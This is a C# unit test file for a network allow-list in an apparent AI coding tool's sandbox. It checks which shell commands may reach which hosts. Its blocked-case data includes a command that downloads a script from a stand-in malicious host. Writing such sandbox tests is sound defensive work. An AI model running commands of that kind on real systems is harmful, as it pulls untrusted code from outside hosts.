using NexCode.Service.Sandbox;

namespace NexCode.Cli.Tests.Sandbox;

public sealed class NetworkAllowListTests
{
    [Theory]
    [InlineData("curl https://api.anthropic.com/v1/messages")]
    [InlineData("curl https://api.openai.com/v1/models")]
    [InlineData("npm install --registry=https://api.openrouter.ai")]
    [InlineData("ping localhost")]
    [InlineData("ping 127.0.0.1")]
    [InlineData("dotnet build")]
    [InlineData("echo hello world")]
    public void IsCommandAllowed_Allows_KnownProvidersAndHostlessCommands(string command)
    {
        var allowed = NetworkAllowList.IsCommandAllowed(command, Array.Empty<string>(), out var host);
        Assert.True(allowed, $"Expected '{command}' to be allowed, but it was blocked on host '{host}'.");
        Assert.Null(host);
    }

    [Theory]
    [InlineData("curl https://example.com/secret", "example.com")]
    [InlineData("wget http://malicious.test/run.sh", "malicious.test")]
    [InlineData("git clone https://github.com/foo/bar.git", "github.com")]
    public void IsCommandAllowed_Blocks_UnlistedHosts(string command, string expectedHost)
    {
        var allowed = NetworkAllowList.IsCommandAllowed(command, Array.Empty<string>(), out var host);
        Assert.False(allowed);
        Assert.Equal(expectedHost, host);
    }

    [Fact]
    public void IsCommandAllowed_AllowsConfiguredMcpEndpoints()
    {
        var allowed = NetworkAllowList.IsCommandAllowed(
            "curl https://my-mcp.example.org/tools",
            ["https://my-mcp.example.org"],
            out _);
        Assert.True(allowed);
    }

    [Fact]
    public void IsCommandAllowed_EmptyCommand_IsAllowed()
    {
        Assert.True(NetworkAllowList.IsCommandAllowed(string.Empty, Array.Empty<string>(), out _));
        Assert.True(NetworkAllowList.IsCommandAllowed("   ", Array.Empty<string>(), out _));
    }

    [Theory]
    [InlineData("https://api.openai.com/v1/", "api.openai.com")]
    [InlineData("api.anthropic.com:443", "api.anthropic.com")]
    [InlineData("localhost", "localhost")]
    public void NormalizeHost_StripsSchemeAndPort(string raw, string expected)
    {
        Assert.Equal(expected, NetworkAllowList.NormalizeHost(raw));
    }
}
